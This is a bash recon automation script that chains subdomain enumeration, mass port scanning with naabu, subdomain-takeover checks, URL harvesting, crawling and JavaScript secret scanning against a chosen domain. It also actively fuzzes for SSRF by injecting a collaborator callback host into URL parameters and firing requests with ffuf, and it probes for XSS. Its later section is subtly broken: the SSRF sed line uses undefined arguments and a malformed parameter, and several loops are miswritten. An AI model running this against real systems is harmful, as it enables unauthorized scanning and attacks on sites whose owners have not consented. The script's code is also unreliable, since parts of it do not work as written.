#!/bin/bash

RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;92m'

mkdir recon
cd recon

echo -e "${RED}===================Simple Recon Automation Script=============================="

echo -e "${GREEN}Please enter your target domain:::${NC}"

read TARGET

echo -e "${GREEN}Please also enter your collaborator payload with protocol:::${NC}"

read COLLAB

echo -e "${GREEN}[+]Finding subdomains using subfinder${NC}"

sleep 3

subfinder -silent > /dev/null 2>&1

sleep 2

subfinder -d $TARGET -silent | httpx -silent | tee subdomains_found.txt


echo -e "${GREEN}[+]Finding subdomains using assetfinder${NC}"

sleep 3

assetfinder --subs-only $TARGET | httpx -silent | tee -a subdomains_found.txt


echo -e "${GREEN}[+]Finding subdomains using crt.sh${NC}"

sleep 3

curl -sk "https://crt.sh/?q=$TARGET" | grep  '<TD>.*</TD>' | sed -e 's/<TD>//' -e 's/<\/TD>//' | grep "$TARGET" | sed 's/<BR>/ /g' | sed 's/^ *//g' | awk '{print $1 "\n" $2}' | sed '/^$/d' | sed 's/^*.//' | sort -u | httpx -silent | tee -a subdomains_found.txt

sleep 3

cat subdomains_found.txt | sort -u | tee final_subs.txt

rm subdomains_found.txt

echo "Subdomains found and Saved!!!"

echo -e "${GREEN}[+]Collecting hosts from urls${NC}"

sleep 3

echo -e "${GREEN}[+]Saving the Page Titles...${NC}"

cat final_subs.txt | get-title -c 50 >> titles.txt

sleep 3
echo -e "${GREEN}[+]Port Scanning the hosts${NC}"

cat final_subs.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' >> naked_hosts.txt

naabu -l naked_hosts.txt -p 80,443,8008,2082,2086,2087,5001,5000,2096,8080,2083,2095,10443,2077,2079,8443,21,8081,4443,3128,8090,9090,2222,9443,20000,8000,8888,444,10000,81,8083,7080,9000,25,8800,4100,7001,3000,3001,9001,8181,1500,8089,10243,8880,4040,18081,9306,9002,8500,11000,7443,12000,2030,465,2031,3702,8889,587,10250,9999,10001,8001,9080,50000,5353,49153,88,82,11300,11211,8834,5984,7071,2121,5006,22222,1000,5222,4848,9943,53,3306,8009,83,5555,8086,8140,8082,49152,14147,9200,5172,8123,60001,3790,17000,13579,8139,32400,21025,25105,85,23424,7548,27017,28017,16992,50050,52869,16010,50100,23023,32764,37215,50070,55442,51106,41800,55554,9998,33060,8887,4433,8088,3780,7777,37777,35000,25001,2376,9123,631,8010,20547,7000,6308,7081,5005,4643,8099,5986,55443,993,9191,84,9444,6080,8200,23,1900,8060,5002,14265,9092,5601,8098,666,7547,5050,8087,1024,8069,9595,9009,22,8085,55553,1234,8545,8112,311,16993,7474,1080,8334,5010,9098,8333,8084,7779,8649,2223,445,9007,7657,143,1025,221,7634,2002,5800,51235,7218,2323,4567,4321,9981,2375,1935,5801,2480,2067,8002,873,880,2020,9944,9869,110,4430,5858,9160,9295,5560,90,8899,4949,992,9082,2332,5900,5432,995,8444,5500,25565,1400,1471,503,5985,5901,6667,3689,1311,3542,4840,5357,8383,808,5003,6664,3541,9008,102,3749,8180,5080,1741,888,2008,6666,1604,89,4664,1883,4782,119,9988,4506,4063,8018,1023,6001,8999,8091,6633,6653,8989,2379,2000,5443,8011,1200,6000,902,4282,9042,5007,502,2455,8043,4911,6443,9997,8006,8852,11,49,4022,15,26,389,6697,2080,8111,19,5577,9084,5009,9088,13,2081,17,86,37,9091,8050,4064,636,99,8003,8859,2404,9010,8100,70,43,3333,7171,8282,8005,180,2345,8021,800,8096,6379,8447,1153,9051,8101,2181,9006,1521,4500,8095,8585,11112,8445,2021,4001,9003,8020,7002,9151,79,8866,7070,8004,8446,4899,8442,27015,179,771,5004,4646,9004,62078,8787,548,54138,9005,3443,8092,9445,8023,8033,8012,8040,8015,8848,1099,3389,8047,448,515,8030,3052,8007,8051,8022,8032,5600,3002,7788,2048,8052,8850,4242,2221,8413,8403,8041,8093,8881,8042,2053,8990,2443,8013,8416,8590,7700,8553,8094,8402,8036,8019,9990,2001,8038,8017,9966,8097,8102,8035,8182,3080,8014,8412,777,8034,8044,8054,8420,7010,8415,8045,20,8891,7979,8418,1111,7778,5569,8037,8857,8046,8025,8877,8988,8053,8686,8843,8049,8110,6565,8103,8048,8107,8104,2100,2761,8126,9100,2762,8222,8108,8055,990,9500,8029,8066,10554,8808,554,8602,9020,5025,7090,2052,8016,7500,8106,8765,8448,8801,8890,2122,4999,8028,8027,8812,8410,9600,8105,8031,9876,8026,8039,8401,8811,2233,8855,98,8845,7005,8935,8830,20256,8791,8432,8804,7004,8833,830,7003,8788,8818,801,3299,6006,8056,8143,3260,8184,8024,8623,9898,7654,8810,3388,1110,3005,8109,8700,8829,8823,7999,8821,8841,9050,8666,6668,8820,1599,8071,8856,8586,7776,9021,9991,8431,7445,7537,8844,8876,8426,8807,8118,8419,8784,8072,8790,8805,8885,8879,9011,9070,7444,8190,8248,8251,8847,2018,8767,8814,8827,8425,8840,8779,9201,8663,8433,8817,8837,8241,8824,450,8424,8838,8236,8414,8422,8621,8809,8969,7510,8873,8237,8766,8853,8991,8430,8865,8159,8423,7433,7493,8421,9761,449,1026,7401,8058,8802,8826,8836,8239,8417,8428,8839,1723,2525,8429,8806,8849,8870,8858,8878,7170,8832,8688,8789,8872,9016,9530,2111,8819,8861,8868,8252,8825,8842,8846,1433,7676,8291,8405,8813,8860,9099,8057,8238,8822,8871,9015,5269,7887,8064,8993,9022,6002,7998,8406,8411,8851,9102,9527,7465,9418,999,8407,8831,8828,100,447,5938,8864,8554,8622,8782,9992,2022,3310,6600,7535,8409,9012,7014,8816,8863,8875,9040,8637,8815,8862,9027,8249,8803,8404,9036,9994,8243,8733,9097,9111,9300,8869,9093,3100,8874,9095,8408,8835,9031,9955,9014,9211,8867,2055,9094,9205,222,2060,8513,9207,21379,91,104,2010,9310,9389,2070,9202,2069,6789,9307,4369,8427,9045,9215,9993,9217,9950,2065,9048,8854,2054,211,1962,2066,9203,789,2150,2352,4002,2059,9023,9101,9204,2058,9038,9026,1235,9013,6580,9049,9218,9029,9105,9110,9222,9690,2200,9019,9210,5150,9030,9251,2063,4445,9214,9743,4786,6008,9682,9032,9107,9220,121,9765,1981,2068,4545,2061,9037,2057,18245,264,2225,9189,9216,9303,1911,9206,9219,9304,113,1028,9041,9299,4730,9108,9305,2351,9208,9221,9301,44818,2626,9035,2056,5678,2250,9103,2062,9028,9034,9106,195,1990 -silent -o port_scan

echo -e "${GREEN}[+]Scanning for possible subdomain takeovers${NC}"

wget "https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json" > /dev/null 2>&1

subjack -w naked_hosts.txt -t 100 -timeout 30 -o subtakeoverresults.txt -a -v -c ./fingerprints.json



sleep 3

echo -e "${GREEN}[+]Gathering urls from web archive. This may take some time for larger scopes${NC}"

sleep 3

cat naked_hosts.txt | waybackurls >> way.txt

cat naked_hosts.txt | gau --subs >> gau.txt


cat way.txt gau.txt | sort -u >> urls.txt

cat urls.txt | httpx -silent -t 500 >> waygau.txt

rm way.txt gau.txt
rm urls.txt

mkdir extensions

echo -e "${GREEN}[+]Gathering and saving urls having extensions only...${NC}"

cat waygau.txt | eae | awk '{print $4}' | sed 's/$/\$/g' | sed 's/^/\\/g' | while read ext do; do grep "$ext" waygau.txt ; done >> extensions/urls_ext.txt

echo -e "${GREEN}[+]Gathering only the paths from urls...${NC}"

sleep 3

cat waygau.txt | unfurl format %s://%d%p >> only_paths.txt

echo -e "${GREEN}[+]Deduplicating the urls...${NC}"

sleep 3

cat waygau.txt | deduplicate --hide-useless --sort >> deduped.txt

echo -e "${GREEN}[+] Crawling the subdomains using headless chrome${NC}"

cat final_subs.txt | while read items do; do crawlergo_cmd -c /usr/bin/google-chrome -t 20 $items; done | tee crawlergo_results.txt

cat crawlergo_results.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u >> crawled_urls.txt

rm crawlergo_results.txt

cat only_paths.txt | grep "\.js$" >> jsfiles.txt

echo -e "${GREEN}Crawling using hakrawler...${NC}"

cat final_subs.txt | hakrawler >> hakrawler_results.txt


echo -e "${GREEN}[+]Testing for ssrf from wayback URLS only...${NC}"

cat waygau.txt | grep "?" | grep "=" | qsreplace $COLLAB >> ssrfFuzz.txt

ffuf -c -w ssrfFuzz.txt -u FUZZ -t 300 -v -r 

cat waygau.txt | sort | uniq | grep "?" | qsreplace -a | qsreplace $COLLAB > ssrf2.txt

sed -i "s|$|\&dest=$2\&redirect=$2\&uri=$2\&path=$2\&continue=$2\&url=$2\&window=$2\&next=$2\&data=$2\&reference=$2\&site=$2\&html=$2\&val=$2\&validate=$2\&domain=$2\&callback=$2\&return=$2\&page=$2\&feed=$2\&host=$2&\port=$2\&to=$2\&out=$2\&view=$2\&dir=$2\&show=$2\&navigation=$2\&open=$2|g" $1-ssrf2.txt
echo "Firing the requests - check your server for potential callbacks"
ffuf -w ssrf2.txt -u FUZZ -t 50

echo -e "${RED} Check your luck in collaborator..."

echo -e "${GREEN}Finding unfiltered characters using kxss...${NC}"

cat waygau.txt | grep "=" | kxss >> kxss_results.txt


echo -e "${GREEN}[+]Gathering for js files, links and secrets:::${NC}"

sleep 5

cat final_subs.txt | getJS | httpx -silent | grep $TARGET >> js1.txt

cat waygau.txt | grep "\.js$" >> js2.txt

cat js1.txt js2.txt | sort -u >> jsurls.txt

rm js1.txt js2.txt

git clone https://github.com/KathanP19/JSFScan.sh.git > /dev/null 2>&1

cd JSFScan.sh

mv ../jsurls.txt .

chmod +x JSFScan.sh install.sh

./install.sh > /dev/null 2>&1

./JSFScan.sh -f jsurls.txt --all -o js_results -r

cd ../

cd ../

zip -r $TARGET-results.zip recon > /dev/null 2>&1

rm -rf recon/

sleep 3

echo -e "${RED}[+] Phewwww! Done...All the results are zipped. This is not the end, Please test remaining stuffs manually***${NC}"
